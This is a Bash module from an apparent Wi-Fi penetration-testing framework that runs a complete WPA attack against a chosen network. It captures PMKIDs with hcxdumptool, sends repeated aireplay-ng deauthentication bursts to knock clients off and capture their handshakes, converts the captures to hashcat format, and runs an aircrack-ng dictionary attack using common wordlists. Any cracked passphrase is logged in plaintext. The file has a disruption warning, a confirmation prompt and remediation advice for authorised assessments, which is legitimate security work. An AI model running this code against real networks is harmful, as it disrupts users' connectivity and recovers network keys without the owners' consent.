#!/usr/bin/env bash
# MODULE_META
# NAME="WPA Handshake & PMKID Capture"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="yes"
# TOOLS="aireplay-ng,aircrack-ng,hcxdumptool,hcxpcapngtool"
# DESC="Capture WPA PMKID and 4-way handshakes, test PSK strength"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
# PCAP="yes"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/d1_wpa_handshake.sh
#  D1: WPA Handshake & PMKID Capture
#
#  PURPOSE:
#    Capture WPA/WPA2 PMKID and 4-way handshakes from the target network.
#    Convert captures to hashcat-compatible format and optionally run a
#    quick dictionary attack to test PSK strength.
#
#  TOOLS: ${TOOL_PATHS[hcxdumptool]}, ${TOOL_PATHS[hcxpcapngtool]}, ${TOOL_PATHS[aircrack-ng]}, ${TOOL_PATHS[aireplay-ng]}
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: A1 (needs target SSID/BSSID/channel)
#
#  EVIDENCE PRODUCED:
#    - d1_hcxdump.pcapng           (raw ${TOOL_PATHS[hcxdumptool]} capture)
#    - d1_handshake.cap            (airodump handshake capture)
#    - d1_hashes.hc22000           (hashcat 22000 format)
#    - d1_crack_results.txt        (dictionary attack results)
#    - d1_findings.txt             (analysis summary)
#
#  RESULT JSON FIELDS:
#    - pmkid_captured: bool
#    - handshake_captured: bool
#    - psk_cracked: bool
#    - cracked_psk: string (if cracked)
#    - hash_file: string (path to hashcat file)
#===============================================================================

set -uo pipefail

run_d1() {
    set -uo pipefail

    local interface=""
    local bssid=""
    local ssid=""
    local channel=""
    local capture_time="${PMKID_CAPTURE_TIME:-60}"
    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"

    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --interface) interface="$2"; shift 2 ;;
            --bssid) bssid="$2"; shift 2 ;;
            --ssid) ssid="$2"; shift 2 ;;
            --channel) channel="$2"; shift 2 ;;
            --timeout) capture_time="$2"; shift 2 ;;
            --evidence-dir) evidence_dir="$2"; shift 2 ;;
            *) shift ;;
        esac
    done

    # Fallbacks to globals
    interface="${interface:-${WIFI_INTERFACE:-}}"
    bssid="${bssid:-${GUEST_BSSID:-}}"
    ssid="${ssid:-${GUEST_SSID:-}}"
    channel="${channel:-${GUEST_CHANNEL:-}}"
    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-.}}"

    local total_steps=7
    local evidence_prefix="${evidence_dir}/d1"

    #--- Step 1: Verify tools ---
    log_step 1 $total_steps "Verifying tools"
    update_tc_progress 1 $total_steps "Checking"

    check_module_dependencies "D1" || return 1

    if [[ -z "$ssid" || -z "$bssid" ]]; then
        log_warn "Target SSID/BSSID not set."
        if ! select_target_network; then
            log_error "No target selected. Run A1 first or enter manually."
            return 1
        fi
        ssid="${GUEST_SSID:-}"
        bssid="${GUEST_BSSID:-}"
        channel="${GUEST_CHANNEL:-}"
    fi

    log_success "Target: ${ssid} (${bssid}) CH ${channel:-auto}"

    #--- Warning banner ---
    echo ""
    echo -e "${C_BG_RED}${C_WHITE}${C_BOLD}"
    echo "  ╔════════════════════════════════════════════════════════════════════╗"
    echo "  ║  ★ WPA HANDSHAKE & PMKID CAPTURE ★                              ║"
    echo "  ║                                                                    ║"
    echo "  ║  This test will:                                                   ║"
    echo "  ║    • Attempt to capture PMKID from AP (clientless attack)         ║"
    echo "  ║    • Send deauth frames to force client re-authentication         ║"
    echo "  ║    • Capture 4-way WPA handshakes                                 ║"
    echo "  ║    • Optionally run quick dictionary attack on captured material   ║"
    echo "  ║                                                                    ║"
    echo "  ║  This WILL disrupt clients on the target network temporarily.     ║"
    echo "  ╚════════════════════════════════════════════════════════════════════╝"
    echo -e "${C_RESET}"
    echo ""
    local confirm=""
    safe_read "Proceed with WPA handshake capture? [Y/n]" confirm "y"
    [[ "${confirm,,}" == "n" ]] && return 1

    local pmkid_captured="false"
    local handshake_captured="false"
    local psk_cracked="false"
    local cracked_psk=""
    local hash_file="${evidence_prefix}_hashes.hc22000"
    local findings_file="${evidence_prefix}_findings.txt"

    {
        echo "============================================================"
        echo "  D1: WPA Handshake & PMKID Capture"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Target: ${ssid} (${bssid})"
        echo "============================================================"
        echo ""
    } > "$findings_file"

    #--- Step 2: Enable monitor mode ---
    log_step 2 $total_steps "Enabling monitor mode"
    update_tc_progress 2 $total_steps "Monitor mode"

    WIFI_INTERFACE="$interface"
    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"
    log_success "Monitor mode active: ${mon_iface}"

    # Set channel if known
    if [[ -n "$channel" && "$channel" != "0" ]]; then
        run_fg iw dev "$mon_iface" set channel "$channel" 2>/dev/null || true
    fi

    check_abort || return 1

    #--- Step 3: PMKID capture with hcxdumptool ---
    log_step 3 $total_steps "Attempting PMKID capture (${capture_time}s)"
    update_tc_progress 3 $total_steps "PMKID capture"

    check_abort || return 1

    local hcx_pcapng="${evidence_prefix}_hcxdump.pcapng"

    if [[ -n "${TOOL_PATHS[hcxdumptool]:-}" ]]; then
        # Create filter file for target BSSID
        local filterlist="$TMP_DIR/d1_filter.txt"
        echo "${bssid}" | tr -d ':' | tr '[:upper:]' '[:lower:]' > "$filterlist"

        log_cmd "hcxdumptool -i ${mon_iface} --filterlist_ap=${filterlist} --filtermode=2 -o ${hcx_pcapng}"

        start_countdown "$capture_time" "Capturing PMKID and handshakes with hcxdumptool"
        timeout "$capture_time" run_fg hcxdumptool -i "$mon_iface" --filterlist_ap="$filterlist" --filtermode=2 --enable_status=1 -o "$hcx_pcapng" >/dev/null 2>&1 || true
        stop_countdown

        rm -f "$filterlist"

        # Convert to hashcat format
        if [[ -f "$hcx_pcapng" && -s "$hcx_pcapng" ]] && [[ -n "${TOOL_PATHS[hcxpcapngtool]:-}" ]]; then
            log_info "Converting capture to hashcat 22000 format..."
            ensure_user_ownership "$hcx_pcapng"
            local hcx_output
            hcx_output=$(run_as_user hcxpcapngtool -o "$hash_file" "$hcx_pcapng" 2>&1 || true)

            echo "hcxpcapngtool output:" >> "$findings_file"
            echo "$hcx_output" >> "$findings_file"
            echo "" >> "$findings_file"

            # Check for PMKID
            if echo "$hcx_output" | grep -qi "PMKID"; then
                local pmkid_count
                pmkid_count=$(echo "$hcx_output" | grep -i "PMKID" | grep -oP '\d+' | head -1) || true
                if [[ "${pmkid_count:-0}" -gt 0 ]]; then
                    pmkid_captured="true"
                    log_result "FINDING" "PMKID captured from ${ssid}! (${pmkid_count} PMKID(s))"
                    echo "FINDING: PMKID captured (${pmkid_count})" >> "$findings_file"
                fi
            fi

            # Check for handshakes
            if echo "$hcx_output" | grep -qi "EAPOL"; then
                local eapol_count
                eapol_count=$(echo "$hcx_output" | grep -i "EAPOL" | grep -oP '\d+' | head -1) || true
                if [[ "${eapol_count:-0}" -gt 0 ]]; then
                    handshake_captured="true"
                    log_result "FINDING" "WPA handshake(s) captured from ${ssid}! (${eapol_count})"
                    echo "FINDING: WPA handshake captured (${eapol_count})" >> "$findings_file"
                fi
            fi

            if [[ -f "$hash_file" && -s "$hash_file" ]]; then
                local hash_count
                hash_count=$(wc -l < "$hash_file")
                log_success "Hash file created: ${hash_file} (${hash_count} hash(es))"
            fi
        fi
    else
        log_info "hcxdumptool not available — skipping PMKID capture"
        echo "SKIPPED: hcxdumptool not available for PMKID capture" >> "$findings_file"
    fi

    #--- Step 4: Handshake capture with airodump + deauth ---
    log_step 4 $total_steps "Capturing handshake via deauth + airodump-ng"
    update_tc_progress 4 $total_steps "Handshake capture"

    check_abort || return 1

    # Only do this if we don't already have a handshake, and aircrack is available
    local handshake_cap="${evidence_prefix}_handshake"

    if [[ "$handshake_captured" == "false" ]]; then
        # Ensure we're on the right channel
        if [[ -n "$channel" ]]; then
            run_fg iw dev "$mon_iface" set channel "$channel" 2>/dev/null || true
        fi

        rm -f "${handshake_cap}"* 2>/dev/null

        log_cmd "airodump-ng --bssid ${bssid} --channel ${channel:-0} --write ${handshake_cap} ${mon_iface}"

        spawn_bg "d1_airodump" "airodump-ng" \
            --bssid "$bssid" \
            --channel "${channel:-0}" \
            --write "$handshake_cap" \
            --output-format pcap \
            "$mon_iface"

        # Send deauth to force re-authentication
        sleep 5
        log_info "Sending deauthentication frames to force handshake..."
        log_cmd "aireplay-ng --deauth 10 -a ${bssid} ${mon_iface}"

        # Send 3 bursts of deauths
        for burst in 1 2 3; do
            run_fg aireplay-ng --deauth 5 -a "$bssid" "$mon_iface" &>/dev/null || true
            sleep 10
        done

        # Let airodump continue capturing
        start_countdown 30 "Waiting for clients to re-authenticate"
        sleep 30
        stop_countdown

        stop_process "d1_airodump"

        # Check for captured handshake
        local cap_file
        cap_file=$(ls "${handshake_cap}"*.cap 2>/dev/null | head -1)

        if [[ -n "$cap_file" && -s "$cap_file" ]]; then
            # Use aircrack to verify handshake is present
            local aircrack_check
            aircrack_check=$(run_fg aircrack-ng "$cap_file" 2>&1 | head -20 || true)

            if echo "$aircrack_check" | grep -qi "1 handshake"; then
                handshake_captured="true"
                log_result "FINDING" "WPA 4-way handshake captured via deauth attack!"
                echo "FINDING: 4-way handshake captured via deauth + airodump-ng" >> "$findings_file"

                # If no hash file yet, convert cap with hcxpcapngtool
                if [[ ! -s "$hash_file" ]] && [[ -n "${TOOL_PATHS[hcxpcapngtool]:-}" ]]; then
                    run_fg hcxpcapngtool -o "$hash_file" "$cap_file" &>/dev/null || true
                fi
            else
                log_info "Capture completed but no complete handshake found"
                echo "INFO: Airodump capture completed but no complete handshake in capture" >> "$findings_file"
            fi
        fi
    elif [[ "$handshake_captured" == "true" ]]; then
        log_info "Handshake already captured via hcxdumptool — skipping airodump method"
    fi

    #--- Step 5: Quick dictionary attack ---
    log_step 5 $total_steps "Running quick dictionary attack"
    update_tc_progress 5 $total_steps "Dictionary attack"

    check_abort || return 1

    local crack_results="${evidence_prefix}_crack_results.txt"

    if [[ "$pmkid_captured" == "true" || "$handshake_captured" == "true" ]]; then
        # Find a wordlist
        local wordlist=""
        local wordlist_candidates=(
            "${WORDLIST_DIR:-}/common_wifi.txt"
            "/usr/share/wordlists/rockyou.txt"
            "/usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt"
            "/usr/share/wordlists/fasttrack.txt"
        )

        for wl in "${wordlist_candidates[@]}"; do
            if [[ -f "$wl" ]]; then
                wordlist="$wl"
                break
            fi
        done

        if [[ -n "$wordlist" && -f "$hash_file" && -s "$hash_file" ]]; then
            log_info "Running dictionary attack with: $(basename "$wordlist")"
            log_cmd "aircrack-ng -w ${wordlist} -l ${crack_results} ${hash_file}"

            # Use the cap file if available, or hash file
            local crack_target="$hash_file"
            local crack_cap
            crack_cap=$(ls "${handshake_cap}"*.cap 2>/dev/null | head -1)
            [[ -n "$crack_cap" && -s "$crack_cap" ]] && crack_target="$crack_cap"

            timeout 300 run_fg aircrack-ng \
                -w "$wordlist" \
                -b "$bssid" \
                -l "$crack_results" \
                "$crack_target" &>/dev/null || true

            if [[ -f "$crack_results" && -s "$crack_results" ]]; then
                cracked_psk=$(cat "$crack_results" | head -1 | xargs)
                if [[ -n "$cracked_psk" ]]; then
                    psk_cracked="true"
                    log_result "CRITICAL" "★ PSK CRACKED: '${cracked_psk}' — weak passphrase!"
                    echo "CRITICAL: PSK cracked with dictionary attack: '${cracked_psk}'" >> "$findings_file"
                fi
            else
                log_info "PSK not found in wordlist ($(basename "$wordlist"))"
                echo "INFO: PSK not cracked with $(basename "$wordlist")" >> "$findings_file"
            fi
        elif [[ -z "$wordlist" ]]; then
            log_info "No wordlist found — skipping dictionary attack"
            echo "INFO: No wordlist available, dictionary attack skipped" >> "$findings_file"
        fi
    else
        log_info "No handshake/PMKID captured — skipping dictionary attack"
        echo "INFO: No material captured, dictionary attack not applicable" >> "$findings_file"
    fi

    #--- Step 6: Disable monitor mode ---
    log_step 6 $total_steps "Restoring managed mode"
    update_tc_progress 6 $total_steps "Cleanup"

    disable_monitor_mode
    sleep 3

    #--- Step 7: Save results ---
    log_step 7 $total_steps "Saving results"
    update_tc_progress 7 $total_steps "Saving"

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ "$psk_cracked" == "true" ]]; then
        result_status="FINDING"
        result_summary="CRITICAL: WPA PSK was cracked via dictionary attack. Passphrase: '${cracked_psk}'. The network uses a weak, guessable passphrase."
        recommendations="1) Use a strong, randomly generated passphrase (minimum 20 characters). 2) Consider WPA3-SAE which is resistant to offline dictionary attacks. 3) Rotate the PSK immediately. 4) Implement 802.1X/EAP authentication instead of PSK for enterprise networks."
    elif [[ "$pmkid_captured" == "true" || "$handshake_captured" == "true" ]]; then
        result_status="FINDING"
        result_summary="WPA handshake/PMKID material was captured. PSK was not cracked with a basic dictionary, but offline brute-force is possible with more resources."
        recommendations="1) Use a strong, randomly generated passphrase (minimum 20 characters). 2) Consider WPA3-SAE which is resistant to offline dictionary attacks. 3) Enable 802.11w (MFP) to prevent deauthentication attacks used for handshake capture. 4) Monitor for repeated deauthentication attacks (WIDS)."
    else
        result_summary="No WPA handshake or PMKID material was captured. The network may be using WPA3-SAE, or conditions prevented capture."
        recommendations="No immediate action needed. Continue monitoring for wireless attack attempts."
    fi

    evidence_register_file "$findings_file"
    [[ -f "$hcx_pcapng" ]] && evidence_register_file "$hcx_pcapng"
    [[ -f "$hash_file" && -s "$hash_file" ]] && evidence_register_file "$hash_file"
    local cap_file_final
    cap_file_final=$(ls "${handshake_cap}"*.cap 2>/dev/null | head -1)
    [[ -n "$cap_file_final" ]] && evidence_register_file "$cap_file_final"

    local result_json
    result_json=$(run_fg jq -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "PMKID: ${pmkid_captured}, Handshake: ${handshake_captured}, Cracked: ${psk_cracked}" \
        --arg recommendations "$recommendations" \
        --arg pmkid_captured "$pmkid_captured" \
        --arg handshake_captured "$handshake_captured" \
        --arg psk_cracked "$psk_cracked" \
        --arg cracked_psk "$cracked_psk" \
        --arg hash_file "$(basename "${hash_file}")" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            pmkid_captured: ($pmkid_captured == "true"),
            handshake_captured: ($handshake_captured == "true"),
            psk_cracked: ($psk_cracked == "true"),
            cracked_psk: $cracked_psk,
            hash_file: $hash_file
        }')

    local has_primary=0
    [[ "$pmkid_captured" == "true" || "$handshake_captured" == "true" ]] && has_primary=1

    save_tc_result "D1" "$result_json" 1 1 $has_primary 1 1 1 0 1 1 1 0
    save_session_state

    # Display summary
    echo ""
    if [[ "$psk_cracked" == "true" ]]; then
        log_result "CRITICAL" "★ WPA PSK CRACKED: '${cracked_psk}'"
    elif [[ "$pmkid_captured" == "true" || "$handshake_captured" == "true" ]]; then
        log_result "FINDING" "WPA material captured — offline cracking possible"
    else
        log_result "SECURE" "No WPA handshake/PMKID captured"
    fi

    return 0
}
